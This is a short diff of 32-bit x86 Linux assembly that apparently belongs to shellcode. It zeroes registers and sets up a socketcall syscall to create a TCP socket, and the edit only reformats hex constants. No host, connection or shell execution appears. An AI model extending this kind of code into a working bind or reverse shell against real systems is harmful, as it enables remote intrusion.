@@ -5,9 +5,9 @@ BITS 32
 xor		eax,eax		; zero out eax
 xor		ebx,ebx		;   "   "  ebx
 push		eax		; push 0x0 on the stack: arg3(protocol) -> 0
-mov		bl,0x1		; socket sub-syscall: 0x01 -> socket()
-push		ebx		; socket type: 0x01 -> SOCK_STREAM
-push		0x02		; socket domain: 0x02 -> AF_INET
+mov		bl,0x1		; socket sub-syscall: 0x1 -> socket()
+push		ebx		; socket type: 0x1 -> SOCK_STREAM
+push		0x2		; socket domain: 0x2 -> AF_INET
 mov		ecx,esp		; let ecx point to our structure above
 mov		al,0x66		; socketcall syscall 0x66
 int		0x80		; let the kernel do the stuff
